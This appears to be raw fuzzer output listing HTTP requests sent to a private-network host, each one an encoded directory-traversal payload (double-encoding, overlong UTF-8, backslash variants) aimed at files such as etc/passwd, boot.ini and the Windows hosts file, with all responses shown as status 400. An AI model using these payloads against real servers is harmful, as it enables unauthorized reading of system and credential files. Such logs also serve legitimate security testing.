24,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
25,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
26,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
27,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
28,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
29,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
31,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
30,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
32,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
33,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
34,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
35,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
36,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
37,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
38,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
39,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
5,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
6,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
7,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
8,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
9,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
10,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
11,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
103,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afpasswd
104,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
1,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
2,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
3,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
4,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
91,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
97,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
100,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
101,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
102,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
107,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afpasswd
105,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
106,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
108,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
110,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
40,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
109,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
42,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
41,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
44,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
49,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
43,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
45,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63boot.ini
47,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
50,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
51,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
48,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
53,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
54,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
60,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
52,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
46,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%%35%%63etc%%35%%63issue
61,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
62,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
63,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
130,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
132,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
134,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
55,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
135,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
136,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
137,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cboot.ini
138,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
56,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
139,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
146,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
142,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
145,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
143,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
147,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
148,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
149,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
140,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
141,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%25c1%259cboot.ini
57,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
152,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
155,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
150,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
156,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
154,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
153,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
158,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
159,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
161,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
151,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
163,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
58,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
157,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
164,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
169,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
168,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
170,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
167,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2fetc%2fpasswd
166,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2fetc%2fissue
165,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2fboot.ini
160,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
178,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
177,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
171,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
172,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
174,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
175,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
179,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
176,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
173,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
180,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
181,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
182,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
183,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
190,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5cetc%5cissue
188,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
195,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
186,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
185,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
193,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
194,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
192,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
184,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
187,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
191,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5cetc%5cpasswd
189,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%5cboot.ini
